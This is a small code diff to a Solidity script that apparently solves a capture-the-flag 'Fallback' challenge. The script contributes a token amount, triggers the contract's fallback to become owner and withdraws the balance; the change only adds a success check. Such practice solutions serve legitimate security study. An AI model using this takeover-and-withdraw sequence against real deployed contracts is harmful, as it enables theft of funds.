@@ -13,7 +13,8 @@ contract FallbackSolution is Script {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
         fallbackIns.contribute{value: 1 wei}();
-        address(fallbackIns).call{value: 1 wei}("");
+        (bool success, ) = address(fallbackIns).call{value: 1 wei}("");
+        require(success, "Transaction failed");
         console.log("New Owner: ", fallbackIns.owner());
         console.log("My address: ", vm.envAddress("MY_ADDRESS"));
         fallbackIns.withdraw();
